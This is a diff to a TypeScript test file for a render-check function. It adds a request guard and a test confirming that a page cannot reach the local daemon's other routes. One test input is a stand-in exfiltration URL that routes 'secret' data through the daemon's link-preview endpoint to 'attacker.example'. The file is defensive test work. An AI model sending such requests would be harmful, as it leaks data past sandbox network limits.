@@ -22,6 +22,8 @@ type FakeOptions = {
 	staleFirstCapture?: boolean;
 	/** PNG bytes per pixel of the captured image, to make large screenshots. */
 	pngBytesPerPixel?: number;
+	/** Requests the page makes while it loads; the session's guard decides each. */
+	requests?: string[];
 };
 
 /**
@@ -38,12 +40,15 @@ function fakes(options: FakeOptions = {}) {
 		for (const listener of paintListeners.splice(0)) listener();
 	};
 	const permissionRequest = vi.fn();
+	const cancelled: Record<string, boolean> = {};
 	const contents = {
 		session: {
 			setPermissionRequestHandler: (handler: (...args: unknown[]) => void) => permissionRequest.mockImplementation(handler),
 			setPermissionCheckHandler: vi.fn(),
 			setProxy: vi.fn(async () => {}),
+			webRequest: { onBeforeRequest: vi.fn() },
 		},
+		id: 7,
 		setWindowOpenHandler: vi.fn(),
 		setWebRTCIPHandlingPolicy: vi.fn(),
 		on: (event: string, listener: (...args: unknown[]) => void) => listeners.set(event, listener),
@@ -54,6 +59,12 @@ function fakes(options: FakeOptions = {}) {
 			// The proxy refuses these while the page loads.
 			const onRefused = vi.mocked(allowRenderPage).mock.lastCall?.[2];
 			for (const destination of options.refused ?? []) onRefused?.(destination);
+			const guard = contents.session.webRequest.onBeforeRequest.mock.lastCall?.[0] as
+				| ((details: { url: string; webContentsId: number }, callback: (response: { cancel: boolean }) => void) => void)
+				| undefined;
+			for (const request of options.requests ?? []) {
+				guard?.({ url: request, webContentsId: contents.id }, ({ cancel }) => (cancelled[request] = cancel));
+			}
 			if (options.loadError) throw options.loadError;
 			listeners.get("console-message")?.({}, 3, "Uncaught ReferenceError: d3 is not defined", 1, url);
 		}),
@@ -106,7 +117,7 @@ function fakes(options: FakeOptions = {}) {
 		target = [...created];
 		return window;
 	});
-	return { contents, window, BrowserWindow, permissionRequest, events, paint };
+	return { contents, window, BrowserWindow, permissionRequest, events, paint, cancelled };
 }
 
 const png = Buffer.from("png-bytes").toString("base64");
@@ -182,6 +193,18 @@ describe("checkRender", () => {
 			{ level: "warning", text: "AO blocked a request to [::1]:22. A render check loads only public addresses." },
 			{ level: "error", text: "Uncaught ReferenceError: d3 is not defined" },
 		]);
+	});
+
+	it("keeps the page off the daemon's other routes, whose host and port the proxy lets through", async () => {
+		const linkPreview = "http://127.0.0.1:3001/api/v1/link-preview?url=https://attacker.example/?d=secret";
+		const f = fakes({ requests: [url, linkPreview, "https://cdn.example/d3.js"] });
+		const result = await checkRender(f as never, { url, width: 390, network: "none" });
+		// Public addresses are the proxy's to refuse; the guard only holds the daemon to the page.
+		expect(f.cancelled).toEqual({ [url]: false, [linkPreview]: true, "https://cdn.example/d3.js": false });
+		expect(result.consoleMessages[0]).toEqual({
+			level: "warning",
+			text: "AO blocked a request to 127.0.0.1:3001/api/v1/link-preview. The agent has no network access, so the check loads no network resources.",
+		});
 	});
 
 	it("releases the page's allowance when the check ends, on success and on error", async () => {
